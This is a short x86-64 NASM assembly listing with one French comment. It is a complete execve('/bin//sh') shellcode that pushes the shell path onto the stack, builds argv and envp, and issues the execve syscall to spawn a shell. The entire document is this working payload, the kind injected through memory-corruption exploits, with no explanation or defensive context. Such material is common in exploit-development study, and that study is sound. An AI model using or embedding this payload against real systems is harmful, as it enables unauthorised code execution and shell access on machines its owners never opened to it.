BITS 64
    xor rax, rax
    push rax
    mov r8, 0x68732f2f6e69622f
    push r8; amd ne peut pas empiler imm64 https://stackoverflow.com/questions/12544957/nasm-64-bit-push-qword
    mov rdi, rsp
    push rax
    mov rdx, rsp
    push rdi
    mov rsi, rsp
    mov al, 0x3b
    syscall